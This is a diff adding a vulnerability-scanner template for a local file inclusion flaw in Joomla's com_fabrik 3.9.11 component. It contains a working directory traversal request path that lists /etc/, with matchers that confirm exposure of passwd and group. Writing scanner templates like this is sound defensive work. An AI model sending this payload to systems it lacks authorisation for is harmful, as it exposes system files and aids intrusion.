@@ -1,0 +1,32 @@
+id: "joomla-com-fabrik-lfi"
+name: "Joomla! com_fabrik 3.9.11 - Local File Inclusion"
+severity: "high"
+description: "Joomla! com_fabrik 3.9.11 is vulnerable to local file inclusion."
+tech:
+  - "php"
+tags:
+  - "joomla"
+  - "lfi"
+  - "edb"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://www.exploit-db.com/exploits/48263"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "\"value\":\"passwd\""
+      - "\"value\":\"group\""
+      - "\"disable\":false"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
